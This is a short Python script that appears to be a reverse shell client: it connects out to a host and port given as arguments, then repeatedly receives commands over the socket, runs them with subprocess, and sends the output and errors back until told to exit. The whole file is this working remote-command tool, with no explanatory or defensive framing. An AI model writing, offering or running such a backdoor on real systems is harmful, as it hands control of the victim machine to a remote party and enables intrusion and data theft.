from socket import *
import sys
import subprocess

addr = sys.argv[1]
port = int(sys.argv[2])
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, port))

s.send('client ready for receiving commands'.encode())
command = s.recv(4096).decode()

while command != 'exit':
    proc = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.communicate()
    if err:
        s.send(err)
    s.send(out)
    command = s.recv(4096).decode()
